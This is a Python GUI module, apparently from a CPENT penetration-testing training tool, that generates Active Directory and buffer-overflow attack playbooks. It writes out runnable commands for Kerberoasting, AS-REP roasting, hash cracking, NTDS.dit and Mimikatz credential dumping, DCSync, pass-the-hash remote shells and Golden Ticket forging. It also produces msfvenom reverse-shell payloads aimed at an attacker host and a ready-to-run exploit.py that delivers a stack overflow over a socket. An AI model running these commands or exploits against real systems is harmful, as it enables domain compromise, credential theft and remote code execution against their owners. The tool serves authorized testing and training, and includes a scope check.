"""Active Directory & Binary Exploitation Playbook Engine for CPENT.

Provides structured, interactive attack command builders covering:
1. Active Directory: BloodHound recon, Kerberoasting (GetUserSPNs), AS-REP Roasting (GetNPUsers),
   DCSync, secretsdump, Mimikatz, Pass-the-Hash, Evil-WinRM, and Golden/Silver tickets.
2. Binary Exploitation: 32/64-bit stack buffer overflow lifecycle (Fuzzing, Pattern Offset,
   Bad Character detection array, Mona JMP ESP finding, msfvenom shellcode, and Python 3 exploit generator).
3. ProxyChains integration: Prefix attacks with proxychains4 for multi-hop pivot environments.
4. Scope Authorization Guard: Cross-references target DC and host IPs with authorized scopes.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict, List, Optional

from PySide6.QtCore import Qt, Signal
from PySide6.QtGui import QColor, QFont
from PySide6.QtWidgets import (
    QApplication,
    QCheckBox,
    QComboBox,
    QFileDialog,
    QFrame,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMessageBox,
    QPlainTextEdit,
    QPushButton,
    QScrollArea,
    QSpinBox,
    QSplitter,
    QTabWidget,
    QVBoxLayout,
    QWidget,
)

from desktop.theme import CPENTTheme
from storage.db import Database
from storage.models import Project, TargetScope


class ADPlaybookWidget(QWidget):
    """Interactive Active Directory & Binary Exploitation Playbook Workspace."""

    command_to_shell_requested = Signal(str)
    runbook_exported = Signal(str)

    def __init__(self, db: Optional[Database] = None, parent: Optional[QWidget] = None):
        super().__init__(parent)
        self.db = db
        self.active_project: Optional[Project] = None
        self._init_ui()

    def set_active_project(self, project: Optional[Project]):
        self.active_project = project
        self._validate_scope()

    def _init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(16, 16, 16, 16)
        main_layout.setSpacing(12)

        # 1. Header Bar
        header_box = QHBoxLayout()
        header_text = QVBoxLayout()
        title = QLabel("⚔️ Active Directory & Advanced Exploitation Playbooks")
        title.setStyleSheet(f"font-size: 16px; font-weight: bold; color: {CPENTTheme.PRIMARY_BLUE};")
        subtitle = QLabel(
            "Synthesize verified attack chains for CPENT Active Directory domains, Kerberos abuse, "
            "credential dumping, and Module 12 stack buffer overflows."
        )
        subtitle.setStyleSheet(f"font-size: 11px; color: {CPENTTheme.SECONDARY_TEXT};")
        header_text.addWidget(title)
        header_text.addWidget(subtitle)
        header_box.addLayout(header_text)
        header_box.addStretch()

        self.btn_export_runbook = QPushButton("💾 Export Runbook (.md)")
        self.btn_export_runbook.setStyleSheet(
            f"background-color: {CPENTTheme.ELEVATED_PANEL}; color: {CPENTTheme.PRIMARY_BLUE}; "
            f"border: 1px solid {CPENTTheme.PRIMARY_BLUE}; font-weight: bold; padding: 6px 14px;"
        )
        self.btn_export_runbook.clicked.connect(self._export_markdown_runbook)
        header_box.addWidget(self.btn_export_runbook)
        main_layout.addLayout(header_box)

        # Scope Warning Banner
        self.lbl_scope_banner = QLabel("Scope Status: Ready")
        self.lbl_scope_banner.setWordWrap(True)
        self.lbl_scope_banner.setStyleSheet(
            f"font-size: 11px; padding: 6px 10px; border-radius: 4px; "
            f"background-color: {CPENTTheme.ELEVATED_PANEL}; color: {CPENTTheme.SECONDARY_TEXT};"
        )
        main_layout.addWidget(self.lbl_scope_banner)

        # Scroll Area for main content
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("background: transparent; border: none;")
        scroll_content = QWidget()
        content_layout = QVBoxLayout(scroll_content)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(12)

        # 2. Shared Target Parameters Bar
        param_group = QGroupBox("1. Engagement Target & Credential Parameters")
        p_layout = QVBoxLayout(param_group)

        # Row 1: Target Network & DC
        row1 = QHBoxLayout()
        box_dom = QVBoxLayout()
        box_dom.addWidget(QLabel("Domain Name (FQDN):"))
        self.edit_domain = QLineEdit("CPENT.LOCAL")
        self.edit_domain.textChanged.connect(self._on_parameters_changed)
        box_dom.addWidget(self.edit_domain)
        row1.addLayout(box_dom)

        box_dc = QVBoxLayout()
        box_dc.addWidget(QLabel("Domain Controller (DC IP):"))
        self.edit_dc_ip = QLineEdit("10.10.10.5")
        self.edit_dc_ip.textChanged.connect(self._on_parameters_changed)
        box_dc.addWidget(self.edit_dc_ip)
        row1.addLayout(box_dc)

        box_tgt = QVBoxLayout()
        box_tgt.addWidget(QLabel("Target Member Host IP:"))
        self.edit_target_host = QLineEdit("10.10.10.20")
        self.edit_target_host.textChanged.connect(self._on_parameters_changed)
        box_tgt.addWidget(self.edit_target_host)
        row1.addLayout(box_tgt)
        p_layout.addLayout(row1)

        # Row 2: Credentials & Listener
        row2 = QHBoxLayout()
        box_user = QVBoxLayout()
        box_user.addWidget(QLabel("Username:"))
        self.edit_user = QLineEdit("administrator")
        self.edit_user.textChanged.connect(self._on_parameters_changed)
        box_user.addWidget(self.edit_user)
        row2.addLayout(box_user)

        box_pass = QVBoxLayout()
        box_pass.addWidget(QLabel("Password / NTLM Hash:"))
        self.edit_pass = QLineEdit("Password123!")
        self.edit_pass.setPlaceholderText("Password or aad3b4...:e19cc...")
        self.edit_pass.textChanged.connect(self._on_parameters_changed)
        box_pass.addWidget(self.edit_pass)
        row2.addLayout(box_pass)

        box_lhost = QVBoxLayout()
        box_lhost.addWidget(QLabel("LHOST (Attacker Kali):"))
        self.edit_lhost = QLineEdit("192.168.1.100")
        self.edit_lhost.textChanged.connect(self._on_parameters_changed)
        box_lhost.addWidget(self.edit_lhost)
        row2.addLayout(box_lhost)

        box_lport = QVBoxLayout()
        box_lport.addWidget(QLabel("LPORT (Shell Port):"))
        self.spin_lport = QSpinBox()
        self.spin_lport.setRange(1024, 65535)
        self.spin_lport.setValue(4444)
        self.spin_lport.valueChanged.connect(self._on_parameters_changed)
        box_lport.addWidget(self.spin_lport)
        row2.addLayout(box_lport)

        p_layout.addLayout(row2)

        # Row 3: Pivot / ProxyChains prefix toggle
        row3 = QHBoxLayout()
        self.chk_proxychains = QCheckBox("⚡ Route Attacks via ProxyChains (Multi-Hop Pivot Mode)")
        self.chk_proxychains.setToolTip("Prefixes generated commands with 'proxychains4 -q' for nested CPENT subnets")
        self.chk_proxychains.toggled.connect(self._on_parameters_changed)
        row3.addWidget(self.chk_proxychains)
        row3.addStretch()
        p_layout.addLayout(row3)

        content_layout.addWidget(param_group)

        # 3. Main Playbook Mode Tabs: Active Directory vs Binary Exploitation
        self.playbook_tabs = QTabWidget()

        # Tab A: Active Directory
        tab_ad = QWidget()
        ad_layout = QVBoxLayout(tab_ad)
        self._init_ad_playbook_ui(ad_layout)
        self.playbook_tabs.addTab(tab_ad, "🛡️ Active Directory Attack Matrix")

        # Tab B: Binary Exploitation & Stack Buffer Overflow
        tab_bin = QWidget()
        bin_layout = QVBoxLayout(tab_bin)
        self._init_binary_playbook_ui(bin_layout)
        self.playbook_tabs.addTab(tab_bin, "💥 Module 12 Binary Stack Overflow")

        content_layout.addWidget(self.playbook_tabs)

        scroll.setWidget(scroll_content)
        main_layout.addWidget(scroll)

        # Initial Command Generation
        self._generate_all_commands()

    # --------------------------------------------------------------------------
    # Active Directory Sub-tabs
    # --------------------------------------------------------------------------
    def _init_ad_playbook_ui(self, layout: QVBoxLayout):
        self.ad_subtabs = QTabWidget()

        # 1. Recon & BloodHound
        self.txt_ad_recon = self._create_command_pane(
            parent_tab=self.ad_subtabs,
            tab_title="1. Recon & BloodHound",
            label="Domain Enumeration & BloodHound Ingestion Commands:",
        )

        # 2. Kerberos Attacks
        self.txt_ad_kerb = self._create_command_pane(
            parent_tab=self.ad_subtabs,
            tab_title="2. Kerberos (TGS & AS-REP)",
            label="Kerberoasting (GetUserSPNs) & AS-REP Roasting (GetNPUsers):",
        )

        # 3. Credential Dumping
        self.txt_ad_creds = self._create_command_pane(
            parent_tab=self.ad_subtabs,
            tab_title="3. Secretsdump & Mimikatz",
            label="NTDS.dit Extraction, Secretsdump, and Mimikatz Commands:",
        )

        # 4. Lateral Movement & WinRM
        self.txt_ad_lateral = self._create_command_pane(
            parent_tab=self.ad_subtabs,
            tab_title="4. Lateral Movement & WinRM",
            label="Pass-the-Hash, Evil-WinRM, WMIExec, and Golden Ticket:",
        )

        layout.addWidget(self.ad_subtabs)

    # --------------------------------------------------------------------------
    # Binary Exploitation Sub-tabs
    # --------------------------------------------------------------------------
    def _init_binary_playbook_ui(self, layout: QVBoxLayout):
        # Additional inputs for buffer overflow
        b_box = QGroupBox("Buffer Overflow Specifications")
        b_box_layout = QHBoxLayout(b_box)

        b_box_layout.addWidget(QLabel("Crash Length:"))
        self.spin_crash_len = QSpinBox()
        self.spin_crash_len.setRange(100, 50000)
        self.spin_crash_len.setValue(2500)
        self.spin_crash_len.valueChanged.connect(self._on_parameters_changed)
        b_box_layout.addWidget(self.spin_crash_len)

        b_box_layout.addWidget(QLabel("EIP Offset:"))
        self.spin_eip_offset = QSpinBox()
        self.spin_eip_offset.setRange(0, 50000)
        self.spin_eip_offset.setValue(2006)
        self.spin_eip_offset.valueChanged.connect(self._on_parameters_changed)
        b_box_layout.addWidget(self.spin_eip_offset)

        b_box_layout.addWidget(QLabel("JMP ESP Address:"))
        self.edit_jmp_esp = QLineEdit("\\xaf\\x11\\x50\\x62")
        self.edit_jmp_esp.setPlaceholderText("\\xaf\\x11\\x50\\x62 (Little-Endian)")
        self.edit_jmp_esp.textChanged.connect(self._on_parameters_changed)
        b_box_layout.addWidget(self.edit_jmp_esp)

        b_box_layout.addWidget(QLabel("Bad Characters:"))
        self.edit_badchars = QLineEdit("\\x00\\x0a\\x0d")
        self.edit_badchars.textChanged.connect(self._on_parameters_changed)
        b_box_layout.addWidget(self.edit_badchars)

        layout.addWidget(b_box)

        self.bin_subtabs = QTabWidget()

        # Step 1: Pattern Offset
        self.txt_bin_pattern = self._create_command_pane(
            parent_tab=self.bin_subtabs,
            tab_title="Step 1: Pattern & Crash",
            label="Metasploit Cyclic Pattern Create & Offset Identification:",
        )

        # Step 2: Bad Characters
        self.txt_bin_badchars = self._create_command_pane(
            parent_tab=self.bin_subtabs,
            tab_title="Step 2: Bad Characters",
            label="Bad Character Test Array Generator (\x00 to \xff):",
        )

        # Step 3: Mona JMP ESP
        self.txt_bin_mona = self._create_command_pane(
            parent_tab=self.bin_subtabs,
            tab_title="Step 3: Mona & JMP ESP",
            label="Mona.py Immunity Debugger & GDB Return Address Commands:",
        )

        # Step 4: Msfvenom Payload
        self.txt_bin_shellcode = self._create_command_pane(
            parent_tab=self.bin_subtabs,
            tab_title="Step 4: Msfvenom Shellcode",
            label="Reverse Shell Payload Generation (Avoiding Bad Characters):",
        )

        # Step 5: Python Exploit Skeleton
        self.txt_bin_exploit = self._create_command_pane(
            parent_tab=self.bin_subtabs,
            tab_title="Step 5: Full Exploit.py",
            label="Ready-to-Deploy Python 3 Buffer Overflow Exploit Script:",
            allow_save_script=True,
        )

        layout.addWidget(self.bin_subtabs)

    def _create_command_pane(
        self,
        parent_tab: QTabWidget,
        tab_title: str,
        label: str,
        allow_save_script: bool = False,
    ) -> QPlainTextEdit:
        tab_w = QWidget()
        l = QVBoxLayout(tab_w)
        l.addWidget(QLabel(label))

        text_edit = QPlainTextEdit()
        text_edit.setReadOnly(True)
        text_edit.setMinimumHeight(160)
        text_edit.setStyleSheet("font-family: monospace; font-size: 11px;")
        l.addWidget(text_edit)

        btn_row = QHBoxLayout()
        btn_copy = QPushButton("📋 Copy Commands")
        btn_copy.clicked.connect(lambda: self._copy_to_clipboard(text_edit.toPlainText()))
        btn_row.addWidget(btn_copy)

        btn_shell = QPushButton("🖥️ Send to Command Shell")
        btn_shell.setStyleSheet(f"background-color: {CPENTTheme.PRIMARY_BLUE}; color: white; font-weight: bold;")
        btn_shell.clicked.connect(lambda: self._send_first_command_to_shell(text_edit.toPlainText()))
        btn_row.addWidget(btn_shell)

        if allow_save_script:
            btn_save = QPushButton("💾 Save exploit.py")
            btn_save.setStyleSheet(f"background-color: {CPENTTheme.SUCCESS_GREEN}; color: white; font-weight: bold;")
            btn_save.clicked.connect(self._save_exploit_script)
            btn_row.addWidget(btn_save)

        btn_row.addStretch()
        l.addLayout(btn_row)

        parent_tab.addTab(tab_w, tab_title)
        return text_edit

    def _on_parameters_changed(self):
        self._generate_all_commands()
        self._validate_scope()

    def _generate_all_commands(self):
        dom = self.edit_domain.text().strip() or "CPENT.LOCAL"
        dc_ip = self.edit_dc_ip.text().strip() or "10.10.10.5"
        target_ip = self.edit_target_host.text().strip() or "10.10.10.20"
        user = self.edit_user.text().strip() or "administrator"
        cred = self.edit_pass.text().strip() or "Password123!"
        lhost = self.edit_lhost.text().strip() or "192.168.1.100"
        lport = self.spin_lport.value()
        pfx = "proxychains4 -q " if self.chk_proxychains.isChecked() else ""

        is_hash = ":" in cred or (len(cred) == 32 and all(c in "0123456789abcdefABCDEF" for c in cred))
        auth_flag = f"-hashes {cred}" if is_hash else f"'{cred}'"

        # ----------------------------------------------------------------------
        # AD 1: Recon & BloodHound
        # ----------------------------------------------------------------------
        recon_cmds = [
            f"# BloodHound Python Data Ingestion",
            f"{pfx}bloodhound-python -d {dom} -u {user} -p {cred} -gc {dc_ip} -c All -ns {dc_ip} --zip",
            f"",
            f"# NetExec / CrackMapExec Domain Reconnaissance",
            f"{pfx}nxc smb {dc_ip} -u {user} -p {cred} --users",
            f"{pfx}nxc smb {dc_ip} -u {user} -p {cred} --groups",
            f"{pfx}nxc smb {dc_ip} -u {user} -p {cred} --shares",
            f"",
            f"# LDAP Domain Dump",
            f"{pfx}ldapdomaindump -u '{dom}\\{user}' -p '{cred}' {dc_ip}",
        ]
        self.txt_ad_recon.setPlainText("\n".join(recon_cmds))

        # ----------------------------------------------------------------------
        # AD 2: Kerberos Attacks
        # ----------------------------------------------------------------------
        kerb_cmds = [
            f"# Kerberoasting (Request SPN TGS Tickets)",
            f"{pfx}GetUserSPNs.py {dom}/{user}:{cred} -dc-ip {dc_ip} -request -outputfile kerberoast_hashes.txt",
            f"",
            f"# Crack Kerberoast TGS Hashes with Hashcat (Mode 13100)",
            f"hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force",
            f"",
            f"# AS-REP Roasting (Accounts without Kerberos Pre-Authentication)",
            f"{pfx}GetNPUsers.py {dom}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip {dc_ip}",
            f"",
            f"# Crack AS-REP Hashes with Hashcat (Mode 18200)",
            f"hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force",
        ]
        self.txt_ad_kerb.setPlainText("\n".join(kerb_cmds))

        # ----------------------------------------------------------------------
        # AD 3: Secretsdump & Mimikatz
        # ----------------------------------------------------------------------
        creds_cmds = [
            f"# Impacket secretsdump (Extract NTDS.dit hashes from Domain Controller)",
            f"{pfx}secretsdump.py {dom}/{user}:{cred}@{dc_ip} -ntds -history -outputfile ntds_dump",
            f"",
            f"# Secretsdump via NTLM Hash (Pass-the-Hash)",
            f"{pfx}secretsdump.py -hashes {cred} {dom}/{user}@{dc_ip}" if is_hash else f"{pfx}secretsdump.py -just-dc-user krbtgt {dom}/{user}:{cred}@{dc_ip}",
            f"",
            f"# Mimikatz Execution Commands (In Memory on compromised Windows host):",
            f"privilege::debug",
            f"sekurlsa::logonpasswords",
            f"lsadump::sam",
            f"lsadump::dcsync /domain:{dom} /user:Administrator",
            f"",
            f"# Crack NTLM Hashes with Hashcat (Mode 1000)",
            f"hashcat -m 1000 -a 0 ntds_dump.ntds /usr/share/wordlists/rockyou.txt --force",
        ]
        self.txt_ad_creds.setPlainText("\n".join(creds_cmds))

        # ----------------------------------------------------------------------
        # AD 4: Lateral Movement & WinRM
        # ----------------------------------------------------------------------
        lateral_cmds = [
            f"# Evil-WinRM Remote Shell",
            f"{pfx}evil-winrm -i {target_ip} -u {user} -H {cred}" if is_hash else f"{pfx}evil-winrm -i {target_ip} -u {user} -p '{cred}'",
            f"",
            f"# Impacket WMIExec (Stealthy WMI execution)",
            f"{pfx}wmiexec.py {dom}/{user}:{cred}@{target_ip}" if not is_hash else f"{pfx}wmiexec.py -hashes {cred} {dom}/{user}@{target_ip}",
            f"",
            f"# Impacket PSExec (Administrative service execution)",
            f"{pfx}psexec.py {dom}/{user}:{cred}@{target_ip}" if not is_hash else f"{pfx}psexec.py -hashes {cred} {dom}/{user}@{target_ip}",
            f"",
            f"# Forge Golden Ticket using Impacket Ticketer (Requires krbtgt NTLM hash and Domain SID)",
            f"ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain {dom} Administrator",
            f"export KRB5CCNAME=Administrator.ccache",
            f"{pfx}psexec.py -k -no-pass {dom}/Administrator@{dc_ip}",
        ]
        self.txt_ad_lateral.setPlainText("\n".join(lateral_cmds))

        # ----------------------------------------------------------------------
        # Binary Exploitation Commands
        # ----------------------------------------------------------------------
        crash_len = self.spin_crash_len.value()
        eip_offset = self.spin_eip_offset.value()
        jmp_esp = self.edit_jmp_esp.text().strip() or "\\xaf\\x11\\x50\\x62"
        badchars = self.edit_badchars.text().strip() or "\\x00\\x0a\\x0d"

        # Step 1: Pattern
        pattern_cmds = [
            f"# 1. Generate Metasploit Cyclic Pattern to determine exact crash length:",
            f"msf-pattern_create -l {crash_len}",
            f"",
            f"# 2. After crashing the application, find the EIP offset using the register hex value:",
            f"# Example: EIP = 386F4337 (or '7Co8')",
            f"msf-pattern_offset -l {crash_len} -q <CRASHED_EIP_VALUE>",
            f"",
            f"# 3. Verify control of EIP by sending {eip_offset} 'A's + 4 'B's (\\x42\\x42\\x42\\x42):",
            f"python3 -c 'print(\"A\" * {eip_offset} + \"B\" * 4 + \"C\" * ({crash_len} - {eip_offset} - 4))'",
        ]
        self.txt_bin_pattern.setPlainText("\n".join(pattern_cmds))

        # Step 2: Bad Characters Array
        badchar_list = [b.strip() for b in badchars.split("\\x") if b.strip()]
        all_chars = []
        for i in range(1, 256):
            h = f"{i:02x}"
            if h not in badchar_list:
                all_chars.append(f"\\x{h}")
        badchar_py_str = "".join(all_chars)

        badchar_cmds = [
            f"# Bad Characters Test Array (Excluding: {badchars}):",
            f'badchars = (',
            f'    b"{badchar_py_str[:64]}"',
            f'    b"{badchar_py_str[64:128]}"',
            f'    b"{badchar_py_str[128:192]}"',
            f'    b"{badchar_py_str[192:]}"',
            f')',
            f"",
            f"# Compare memory in Immunity Debugger:",
            f"!mona bytearray -b \"{badchars}\"",
            f"!mona compare -a <ESP_ADDRESS> -f bytearray.bin",
        ]
        self.txt_bin_badchars.setPlainText("\n".join(badchar_cmds))

        # Step 3: Mona JMP ESP
        mona_cmds = [
            f"# Locate reliable JMP ESP address without SafeSEH, ASLR, or Rebase in Immunity Debugger:",
            f"!mona jmp -r esp -cpb \"{badchars}\"",
            f"",
            f"# Alternative Mona module inspection:",
            f"!mona modules",
            f"!mona find -s \"\\xff\\xe4\" -m <VULNERABLE_DLL_NAME>.dll",
            f"",
            f"# GDB (Linux ELF) JMP ESP / Call ESP search:",
            f"ropgadget --binary <binary> | grep 'jmp esp'",
        ]
        self.txt_bin_mona.setPlainText("\n".join(mona_cmds))

        # Step 4: Msfvenom Shellcode
        msf_cmds = [
            f"# Windows 32-bit Reverse TCP Shellcode (Avoiding: {badchars}):",
            f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -b '{badchars}' -f python -v buf",
            f"",
            f"# Linux 32-bit Reverse TCP Shellcode:",
            f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -b '{badchars}' -f python -v buf",
            f"",
            f"# Start Netcat listener on Attacker Kali:",
            f"nc -lvnp {lport}",
        ]
        self.txt_bin_shellcode.setPlainText("\n".join(msf_cmds))

        # Step 5: Full Exploit.py Skeleton
        exploit_skeleton = f'''#!/usr/bin/env python3
"""CyberSecuritySuite Automated Buffer Overflow Exploit Script
Target: {target_ip} | EIP Offset: {eip_offset} | JMP ESP: {jmp_esp}
"""

import socket
import sys

TARGET_IP = "{target_ip}"
TARGET_PORT = 9999

# 1. Total Offset to EIP
offset = {eip_offset}
overflow = b"A" * offset

# 2. Return Address (JMP ESP) in Little-Endian format
retn = b"{jmp_esp}"

# 3. NOP Sled (Safe space for shellcode decoder)
padding = b"\\x90" * 16

# 4. Msfvenom Shellcode Payload (LHOST={lhost}, LPORT={lport})
# Generated avoiding bad characters: {badchars}
buf = (
    b"\\xdb\\xdf\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\\x52\\xba\\x3e\\x7b"
    b"\\x62\\x70\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\xc0\\x7a\\x65\\x3a\\x7a"
)

# 5. Full Exploit Payload Construction
payload = overflow + retn + padding + buf

print(f"[*] Connecting to {{TARGET_IP}}:{{TARGET_PORT}}...")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((TARGET_IP, TARGET_PORT))
    print(f"[*] Sending exploit payload ({{len(payload)}} bytes)...")
    s.send(payload + b"\\r\\n")
    s.close()
    print("[+] Exploit payload delivered! Check your Netcat listener on port {lport}.")
except Exception as e:
    print(f"[-] Exploit failed: {{e}}")
    sys.exit(1)
'''
        self.txt_bin_exploit.setPlainText(exploit_skeleton)

    def _validate_scope(self):
        dc_ip = self.edit_dc_ip.text().strip()
        tgt_ip = self.edit_target_host.text().strip()

        if not self.db or not self.active_project:
            self.lbl_scope_banner.setText("Scope Status: Ready (Active project scope rules will be verified).")
            self.lbl_scope_banner.setStyleSheet(
                f"font-size: 11px; padding: 6px 10px; border-radius: 4px; "
                f"background-color: {CPENTTheme.ELEVATED_PANEL}; color: {CPENTTheme.SECONDARY_TEXT};"
            )
            return

        scopes = self.db.list_scopes(self.active_project.id)
        from core.scope import ScopeAuthorizationService

        dc_auth = ScopeAuthorizationService.is_target_authorized(dc_ip, scopes) if dc_ip else None
        tgt_auth = ScopeAuthorizationService.is_target_authorized(tgt_ip, scopes) if tgt_ip else None

        if (dc_auth is None or dc_auth.is_allowed) and (tgt_auth is None or tgt_auth.is_allowed):
            self.lbl_scope_banner.setText(f"✓ Authorized Scope: DC ({dc_ip}) and Target ({tgt_ip}) are in approved project scope.")
            self.lbl_scope_banner.setStyleSheet(
                f"font-size: 11px; padding: 6px 10px; border-radius: 4px; "
                f"background-color: rgba(38,166,154,0.15); color: {CPENTTheme.SUCCESS_GREEN}; font-weight: bold;"
            )
        else:
            unauth = []
            if dc_auth and not dc_auth.is_allowed:
                unauth.append(f"DC ({dc_ip})")
            if tgt_auth and not tgt_auth.is_allowed:
                unauth.append(f"Target ({tgt_ip})")
            self.lbl_scope_banner.setText(
                f"⚠ Out-of-Scope Warning: {', '.join(unauth)} is outside approved scope! "
                "Active Directory exploitation against unauthorized targets is strictly prohibited."
            )
            self.lbl_scope_banner.setStyleSheet(
                f"font-size: 11px; padding: 6px 10px; border-radius: 4px; "
                f"background-color: rgba(229,115,115,0.15); color: {CPENTTheme.ERROR_RED}; font-weight: bold;"
            )

    def _send_first_command_to_shell(self, full_text: str):
        lines = [line.strip() for line in full_text.splitlines() if line.strip() and not line.strip().startswith("#")]
        if lines:
            self.command_to_shell_requested.emit(lines[0])

    def _copy_to_clipboard(self, text: str):
        if text:
            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            QMessageBox.information(self, "Copied", "Commands copied to clipboard.")

    def _save_exploit_script(self):
        code = self.txt_bin_exploit.toPlainText()
        if not code:
            return

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Buffer Overflow Exploit Script",
            str(Path.cwd() / "exploit.py"),
            "Python Files (*.py);;All Files (*)",
        )
        if file_path:
            try:
                Path(file_path).write_text(code, encoding="utf-8")
                QMessageBox.information(self, "Exploit Saved", f"Saved exploit script to:\n{file_path}")
            except Exception as exc:
                QMessageBox.critical(self, "Save Failed", f"Could not write file: {exc}")

    def _export_markdown_runbook(self):
        dom = self.edit_domain.text().strip()
        dc_ip = self.edit_dc_ip.text().strip()
        user = self.edit_user.text().strip()

        doc_lines = [
            f"# CPENT Engagement Attack Runbook: {dom}",
            f"**Target Domain:** `{dom}`",
            f"**Domain Controller:** `{dc_ip}`",
            f"**Initial Username:** `{user}`",
            f"",
            f"## 1. Active Directory Reconnaissance & BloodHound",
            f"```bash",
            self.txt_ad_recon.toPlainText(),
            f"```",
            f"",
            f"## 2. Kerberos Exploitation (TGS & AS-REP)",
            f"```bash",
            self.txt_ad_kerb.toPlainText(),
            f"```",
            f"",
            f"## 3. Credential Dumping & Secretsdump",
            f"```bash",
            self.txt_ad_creds.toPlainText(),
            f"```",
            f"",
            f"## 4. Lateral Movement & WinRM",
            f"```bash",
            self.txt_ad_lateral.toPlainText(),
            f"```",
            f"",
            f"## 5. Binary Stack Overflow Lifecycle",
            f"```bash",
            self.txt_bin_pattern.toPlainText(),
            f"```",
        ]
        md_content = "\n".join(doc_lines)

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Attack Runbook (Markdown)",
            str(Path.cwd() / f"CPENT_Runbook_{dom}.md"),
            "Markdown Files (*.md);;All Files (*)",
        )
        if file_path:
            try:
                Path(file_path).write_text(md_content, encoding="utf-8")
                self.runbook_exported.emit(file_path)
                QMessageBox.information(self, "Runbook Exported", f"Successfully exported Markdown runbook to:\n{file_path}")
            except Exception as exc:
                QMessageBox.critical(self, "Export Failed", f"Could not write file: {exc}")

